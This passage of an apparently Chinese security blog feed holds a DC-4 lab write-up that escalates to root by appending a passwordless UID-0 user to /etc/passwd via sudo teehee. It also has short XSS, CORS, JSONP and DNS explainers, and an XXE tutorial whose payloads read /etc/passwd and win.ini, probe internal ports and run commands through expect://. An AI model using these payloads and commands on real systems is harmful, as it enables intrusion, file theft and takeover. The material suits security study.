src="/img/DC-4-17.png" srcset="/img/loading.gif" lazyload><br>登陆之后可以查看之前不能看的mbox文档，这是一个邮件<br><img src="/img/DC-4-18.png" srcset="/img/loading.gif" lazyload><br>完整的信息我们可以在&#x2F;var&#x2F;spool&#x2F;mail下查看可以得到charles用户密码<br><img src="/img/DC-4-19.png" srcset="/img/loading.gif" lazyload><br>这里我们进行一个登录<br><strong>sudo提权</strong><br>sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知<br>道 root 的密码。<br>首先通过信息收集，查看是否存在sudo配置不当的可能。如果存在，寻找低权限sudo用户的密码，进而<br>提权。<br><img src="/img/DC-4-20.png" srcset="/img/loading.gif" lazyload><br>进入到&#x2F;var&#x2F;bin目录下使用teehee提权，核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;admin::0:0:::/bin/bash&quot;</span> | sudo teehee -a <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>直接切换到admin超级用户提权成功，最后查看root文件下的flag文件</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞</title>
    <link href="/2023/07/03/XSS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/07/03/XSS%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="xss漏洞介绍"><a href="#xss漏洞介绍" class="headerlink" title="xss漏洞介绍"></a>xss漏洞介绍</h2><p>XSS攻击全称跨站脚本攻击，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生xss攻击。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CORS跨域资源共享漏洞</title>
    <link href="/2023/07/01/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/07/01/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="CORS跨域资源共享漏洞"><a href="#CORS跨域资源共享漏洞" class="headerlink" title="CORS跨域资源共享漏洞"></a>CORS跨域资源共享漏洞</h2><h3 id="cors跨域资源共享"><a href="#cors跨域资源共享" class="headerlink" title="cors跨域资源共享"></a>cors跨域资源共享</h3><p>跨域资源共享（CROS）是一种放款同源策略的机制，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>我们先来简单分析一下CORS跨域获取资源的过程：<br>CORS定义了两种跨域请求：简单请求和非简单请求。简单跨域请求就是使用设定的请求方式请求数据，而非简单跨域请求则是在使用设定的请求方式请求数据之前，先发送一个OPTIONS预检请求，验证请求源是否为服务端允许源。只有“预检”通过后才会再发送一次请求用于数据传输。</p><p>当我们需要发送一个跨域请求的时候，浏览器会首先检查这个请求，如果它是简单跨域请求，浏览器就会立即发送这个请求。如果它是非常简单跨域请求，这时候浏览器不会马上发送这个请求，而是有一个跟服务器预验证的过程</p><p>CORS运行机制：<br>在浏览器进行请求时，自动在请求头中添加Origin字段，<br>服务器通过验证Origin字段来判断请求是否被允许，从而实现浏览器进行跨源访问<br>CORS漏洞：<br>浏览器自动在Http请求头上加上Origin字段，服务器通过判断Origin字段的值来判断，请求是否可以读取本站资源。</p><p>跨域的字典解释<br>        Access-Control-Allow-Origin：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。<br>        Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。当设置为true时，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送cookie，删除该字段即可<br>        Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponHeader（）方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CORS跨域资源共享漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSONP漏洞</title>
    <link href="/2023/07/01/JSONP%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/07/01/JSONP%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="JSONP漏洞"><a href="#JSONP漏洞" class="headerlink" title="JSONP漏洞"></a>JSONP漏洞</h2><h3 id="JSONP描述"><a href="#JSONP描述" class="headerlink" title="JSONP描述"></a>JSONP描述</h3><p>​       Json是json的一种“使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。<br>​      为什么我们从不同的域（网站）访问数据需要一个特殊的技术（JSONP）呢？这是因为同源策略，同源策略，它是由Netscape提出的一个著名的安全策略，现在所有支持JavaScript的浏览器都会使用这个策略。<br>传入callback值会在结果里面直接返回。因此，如果该参数过滤不严格。可以随便输入：callback值为：alert(‘1’);parseResponse字符串，返回结果会打印个alert窗口，然后也会正常执行<br>​        攻击者模拟用户向有漏洞的服务器发送JSONP请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务</p><h3 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h3><p>​       JSONP的最基本的原理是：动态添加一个&lt; script &gt;标签，而script标签的src属性是没有跨域的限制的。由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口都相同）的资源，如果要进行跨域请求，我们可以通过使用html的script标记来进行跨域请求，并在响应中返回要执行的script代码，其中可以直接使用JSON传递javascript对象<br>​       考虑这样一种情况，存在两个网站A和B，用户在网站B上注册并且填写了自己的用户名，手机号，身份证号等信息，并且网站B存在一个jsonp接口，用户在访问网站B的时候。这个jsonp接口会返回用户的个人信息，并在网站B的html页面上进行显示。如果网站B对此jsonp接口的来源验证存在漏洞，那么当用户访问网站A时，网站A便可以利用此漏洞进行JSONP劫持来获取用户的信息。<br><img src="/img/JSONP%E6%BC%8F%E6%B4%9E1.png" srcset="/img/loading.gif" lazyload></p><h3 id="JSONP漏洞攻击方法"><a href="#JSONP漏洞攻击方法" class="headerlink" title="JSONP漏洞攻击方法"></a>JSONP漏洞攻击方法</h3><p>攻击方法与csrf类似，都是需要用户登录账号，身份证还没有被消除的情况下访问攻击者精心设计好的页面。就会获取json数据，把json数据发送给攻击者。寻找敏感json数据api接口，构造恶意的代码。发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/2023/06/28/DNS/"/>
    <url>/2023/06/28/DNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h2><p>DNS是Domain Name System的缩写，也就是域名解析系统，它的作用非常简单，就是根据域名查出对应IP。</p><h2 id="域名形式"><a href="#域名形式" class="headerlink" title="域名形式"></a>域名形式</h2><p>域名可以或分为各个子域，，子域还可以继续划分为子域的子域，这样就形成了顶级域、二级域、三级域。<br><img src="/img/DNS1.png" srcset="/img/loading.gif" lazyload><br>其中顶级域名分为：国家域名、通用域名、反向域名。</p><table><thead><tr><th align="left">国家顶级域名</th><th>中国：cn，美国：us，英国：uk………….</th></tr></thead><tbody><tr><td align="left">通用顶级域名</td><td>com公司企业，edu教育机构,gov政府部门,int国际组织,mil军事部门</td></tr><tr><td align="left">反向域名</td><td>arpa，用于PTR查询</td></tr></tbody></table><h2 id="域名的层级"><a href="#域名的层级" class="headerlink" title="域名的层级"></a>域名的层级</h2><ul><li>根域名：.root或者.，根域名通常是省略的</li><li>顶级域名：如.com，.cn等</li><li>次级域名：baidu.com里的baidu，这个是用户可以进行注册购买的</li><li>主机域名：比如baike.baidu.com里的baike，这个是用户可分配的</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">主机名.次级域名.顶级域名.根域名<br><br>baike<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.root<br></code></pre></td></tr></table></figure><h3 id="域名是分层结构，域名服务器也是对应的层级结构"><a href="#域名是分层结构，域名服务器也是对应的层级结构" class="headerlink" title="域名是分层结构，域名服务器也是对应的层级结构"></a>域名是分层结构，域名服务器也是对应的层级结构</h3><p>有了域名结构，还需要有一个东西去解析域名，域名需要由遍及全世界的域名服务器去解析，域名服务器实际上就是装有域名系统的主机。</p><p>由高到低进行层次划分可以分为以下几类</p><table><thead><tr><th>分类</th><th>作用</th></tr></thead><tbody><tr><td>根域名服务器</td><td>最高层次域名服务器，本地域名服务器解析不了的域名就会向其求助</td></tr><tr><td>顶级域名服务器</td><td>负责管理在该顶级域名服务器下注册的二级域名</td></tr><tr><td>权限域名服务器</td><td>负责一个区的域名解析工作</td></tr><tr><td>本地域名服务器</td><td>当一个主机发出DNS查询请求时，这个查询请求首先发给本地域名服务器</td></tr></tbody></table><p>注：一个域名服务器所负责的范围，或者说有管理权限的范围，就称为区域</p><h3 id="DNS资源记录"><a href="#DNS资源记录" class="headerlink" title="DNS资源记录"></a>DNS资源记录</h3><p>在DNS服务器上，一个域名及其下级域名组成一个区域（Zone）。一个Zone的相关的DNS信息构成一个数据库文件。</p><p>下面是一条A类型资源记录（简称A记录）：域名<a href="http://www.zdns.com的数据为202.172.11.10">www.zdns.com的数据为202.172.11.10</a></p><table><thead><tr><th>Domain</th><th>TTL</th><th>class</th><th>type</th><th>rdata</th></tr></thead><tbody><tr><td>域名</td><td>生存周期</td><td>网络&#x2F;协议类型</td><td>资源记录类型</td><td>资源记录数据</td></tr><tr><td><a href="http://www.zdns/">www.zdns</a></td><td>600</td><td>IN</td><td>A</td><td>202.173.11.10</td></tr></tbody></table><p>记录一条域名信息映射关系，称之为资源记录（RR）。当我们查询域名<a href="http://www.zdns.cn的时候，查询结果得到的资源记录结构体中有如下数据：">www.zdns.cn的时候，查询结果得到的资源记录结构体中有如下数据：</a></p><ul><li>TTL，就是生存周期，是递归服务器会在缓存中保存该资源记录的时常</li><li>网络&#x2F;协议类型，它代表的标识是IN，IN就是internet，目前DNS系统主要支持的协议就是IN</li><li>type，就是资源记录类型，一般的网站都是A记录（IPv4的主机地址）</li><li>rdata是资源记录数据，就是域名关联的信息数据</li></ul><p>常见的资源记录类型如表所示</p><table><thead><tr><th>类型</th><th>编码</th><th>内容</th></tr></thead><tbody><tr><td>A</td><td>1</td><td>将DNS域名映射到IPv4地址，基本作用是说明一个域名对哪些IPv4地址</td></tr><tr><td>NS</td><td>2</td><td>权威名称服务器记录，用于说明这个区域有哪些DNS服务器负责解析</td></tr><tr><td>CNAME</td><td>5</td><td>别名记录，主机别名对应的规范名称</td></tr><tr><td>SOA</td><td>6</td><td>趋势授权机构记录，NS记录说明了有多台服务器在进行解析，但哪一个才是主服务器，NS并没有说明，SOA记录了说明在众多ND记录里哪一台才是主要的服务器</td></tr><tr><td>PTR</td><td>12</td><td>IP地址反向解析，是A记录的逆向记录，作用是吧IP解析为域名</td></tr><tr><td>MX</td><td>15</td><td>邮件交换记录，指定负责接受和发送到域中的电子邮件的主机</td></tr><tr><td>TXT</td><td>16</td><td>文本资源记录，用来为某个主机名或域名设置的说明</td></tr><tr><td>AAAA</td><td>28</td><td>将DNS域名映射到IPv6地址，基本作用是说明一个域名对应了哪些IPv6地址</td></tr></tbody></table><h3 id="域名解析中，A记录、CNAME、MX记录、NS记录的区别和联系？"><a href="#域名解析中，A记录、CNAME、MX记录、NS记录的区别和联系？" class="headerlink" title="域名解析中，A记录、CNAME、MX记录、NS记录的区别和联系？"></a><strong>域名解析中，A记录、CNAME、MX记录、NS记录的区别和联系？</strong></h3><p>联系：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">都是区域（<span class="hljs-type">Zone</span>）数据库文件都是由资源记录<br></code></pre></td></tr></table></figure><p><strong>A记录：又称IP指向</strong><br>用户可以在此设置子域名并指向到自己的目标主机地址上，从而通过域名找到服务器。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">说明：指向的目标主机地址类只能使用<span class="hljs-built_in">IP</span>地址；<br>附加说明：<br></code></pre></td></tr></table></figure><ul><li>泛域名解析即将该域名所有未指定的子域名都指向一个空间。在“主机名”中填入*，类型为A，“IP地址&#x2F;主机名”中填入web服务器的IP地址，点击“新增”按钮即可。</li><li>负载均衡的实现：负载均衡（Server Load Balancing，SLB）是指在一系列资源上面动态地分布网络负载。负载均衡可以减少网络拥塞，提高网络性能，提高自愈性，并确保企业关键性应用的可用性</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">当相同子域名有多个目标地址时，表示轮循，可以达到负载均衡的目的，但需要虚拟主机服务商支持<br></code></pre></td></tr></table></figure><p><strong>CNAME：通常称别名指向</strong><br>您可以为一个主机设置别名。<br>比如设置test.mydomain.com，用来指向一个主机<a href="http://www.rddns.com,那么以后就可以用test.mudomain.com来代替访问www.rddns.com了/">www.rddns.com，那么以后就可以用test.mudomain.com来代替访问www.rddns.com了</a><br>说明：</p><ul><li>CNAME的目标主机地址只能使用主机名，不能使用IP地址；</li><li>主机名前不能有任何其他前缀，如：http:&#x2F;&#x2F;等是不被允许的；</li><li>A记录优先于CNAME记录。即如果一个主机地址同时存在A记录和CNAME记录，则CNAME记录不生效</li></ul>]]></content>
    
    
    <categories>
      
      <category>计网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/2023/06/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2023/06/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE漏洞</title>
    <link href="/2023/06/16/XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/06/16/XXE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h3><p>XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记<br>语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文<br>档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [ &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span> &lt;!--定义 note 元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 from 元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 head 元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 body 元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]]]&gt;</span><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="常见的XML语法结构如下图所示："><a href="#常见的XML语法结构如下图所示：" class="headerlink" title="常见的XML语法结构如下图所示："></a>常见的XML语法结构如下图所示：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML 申明--&gt;</span><br></code></pre></td></tr></table></figure><p><strong>其中，文档定义类型（DTD）可以是内部声明也可以引用外部 DTD。</strong></p><p>内部声明 DTD 格式：<!DOCTYPE 根元素 [元素声明]>。<br>引用外部 DTD 格式：<!DOCTYPE 根元素 SYSTEM “文件名">。</p><p>在 DTD 中进行实体说明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷<br>方式的变量。<strong>实体可在内部或外部进行声明。</strong></p><p>内部声明实体格式：<!ENTITY 实体名称 “实体的值">。<br>引用外部实体格式：<!ENTITY 实体名称 SYSTEM “URI">。</p><p><strong>SYSTEM、PUBLIC 对外部资源进行申请。</strong><br><strong>由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞</strong>，那么重点看下能引用哪些类型的外部实体。当libXML &lt;libxml2.9 才会造成外部注入漏洞。<br><img src="/img/xxe1.png" srcset="/img/loading.gif" lazyload></p><p>语法引用外部的实体，而非内部实体，那么 URI 中能写哪些类型的外部实体呢？主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：<br><img src="/img/xxe2.png" srcset="/img/loading.gif" lazyload></p><h3 id="XXE代码分析"><a href="#XXE代码分析" class="headerlink" title="XXE代码分析"></a>XXE代码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_POST[&#x27;submit&#x27;]) and $_POST[&#x27;xml&#x27;] != null)&#123;<br>$xml =$_POST[&#x27;xml&#x27;];<br>// $xml = $test;<br>$data = @simplexml_load_string($xml,&#x27;SimpleXMLElement&#x27;,LIBXML_NOENT);<br>if($data)&#123;<br>$html.=&quot;&lt;pre&gt;&#123;$data&#125;&lt;/pre&gt;&quot;;<br>&#125;else&#123;<br>$html.=&quot;&lt;p&gt;XML 声明、DTD 文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;;<br>&#125;<br>&#125;<br>?&gt;<br>获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入<br>测试的 payload<br>&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;/x&gt;<br></code></pre></td></tr></table></figure><h3 id="XXE代码2"><a href="#XXE代码2" class="headerlink" title="XXE代码2"></a>XXE代码2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$string_xml = &#x27;&lt;?xml version=&quot;1.0&quot;<br>encoding=&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;xml<br>实体注入&lt;/body&gt;&lt;/note&gt;&#x27;;<br>$xml = isset($_GET[&#x27;xml&#x27;])?$_GET[&#x27;xml&#x27;]:$string_xml;<br>$data = simplexml_load_string($xml);<br>echo &#x27;&lt;meta charset=&quot;UTF-8&quot;&gt;&#x27;;<br>print_r($data);<br>?&gt;<br>获取 xml 变量 创建 dom 对象 转入 xml 进行处理输出。<br>simplexml_load_string() 函数把 XML 字符串载入对象中<br></code></pre></td></tr></table></figure><h3 id="XXE漏洞攻击"><a href="#XXE漏洞攻击" class="headerlink" title="XXE漏洞攻击"></a>XXE漏洞攻击</h3><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a [<span class="hljs-meta">&lt;!ENTITY b <span class="hljs-string">&quot;xxe&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a [<span class="hljs-meta">&lt;!ENTITY b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a [<span class="hljs-meta">&lt;!ENTITY b <span class="hljs-keyword">SYSTEM</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url编码<br>读取windows文件<a href="http://127.0.0.1/xxe.php?xml=">http://127.0.0.1/xxe.php?xml=</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;%3fxml version%3d&quot;1.0&quot;%3f&gt;<span class="hljs-meta">&lt;!DOCTYPE%20 a%20 [<span class="hljs-meta">&lt;!ENTITY b <span class="hljs-keyword">SYSTEM</span><span class="hljs-string">&quot;file%3a%2f%2f%2fC%3a%2fWindows%2fwin.ini&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span>%26b%3b&lt;%2fc&gt;<br></code></pre></td></tr></table></figure><p>linux用&#x2F;etc&#x2F;passwd测试</p><h5 id="2、用php伪协议测试"><a href="#2、用php伪协议测试" class="headerlink" title="2、用php伪协议测试"></a>2、用php伪协议测试</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xdsec</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">methodname</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=phpinfo.php&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="3、扫描内网和端口"><a href="#3、扫描内网和端口" class="headerlink" title="3、扫描内网和端口"></a>3、扫描内网和端口</h5><p>通过扫描 ip 和端口确定内网机器的 ip 和端口开发情况，访问端口会获取 baner 信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="4、执行命令"><a href="#4、执行命令" class="headerlink" title="4、执行命令"></a>4、执行命令</h5><p>若开启 expect 扩展</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://webpenter.com/xxe.php?xml=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://whoami&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="无回显"><a href="#无回显" class="headerlink" 